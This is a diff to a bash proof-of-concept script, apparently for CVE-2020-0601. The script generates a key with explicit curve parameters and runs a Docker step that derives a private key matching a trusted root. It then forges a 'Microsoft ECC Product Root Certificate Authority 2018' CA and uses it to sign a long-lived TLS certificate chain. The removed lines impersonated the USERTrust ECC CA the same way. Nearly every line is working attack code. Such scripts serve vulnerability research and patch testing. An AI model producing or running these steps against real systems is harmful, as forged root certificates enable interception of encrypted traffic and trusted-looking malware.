@@ -1,8 +1,23 @@
 #!/usr/bin/env bash
+set -e # exit if a command exists with non-zero
 
-openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit
-pipenv run python gen_key.py
-openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x5c8b99c55a94c5d27156decd8980cc26 -subj "/C=US/ST=New Jersey/L=New Jersey/O=The USERTRUST Network/OU=IT/CN=USERTrust ECC Certification Authority"
-openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pem 
-openssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr
-openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf 
+openssl ecparam -name secp384r1 -genkey -noout -out p384.key -param_enc explicit
+
+echo "Creating Private Key based on trusted Public Certificate"
+docker build -t cve-2020-0601 .
+docker run -it --rm -v $(pwd):/app -w /app cve-2020-0601
+
+echo "Create CA from fabricated Private Key"
+openssl req -new -x509 -key spoofed_ca.key -out spoofed_ca.crt -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Organization/CN=Microsoft ECC Product Root Certificate Authority 2018"
+openssl ecparam -name secp384r1 -genkey -noout -out cert.key
+openssl req -new -key cert.key -out cert.csr -config openssl_tls.conf -reqexts v3_tls
+openssl x509 -req -in cert.csr -CA spoofed_ca.crt -CAkey spoofed_ca.key -CAcreateserial -out cert.crt -days 10000 -extfile openssl_tls.conf -extensions v3_tls
+
+cat cert.crt spoofed_ca.crt > cert_chain.crt
+
+rm  cert.crt \
+    cert.csr \
+    p384.key \
+    spoofed_ca.crt \
+    spoofed_ca.key \
+    spoofed_ca.srl 
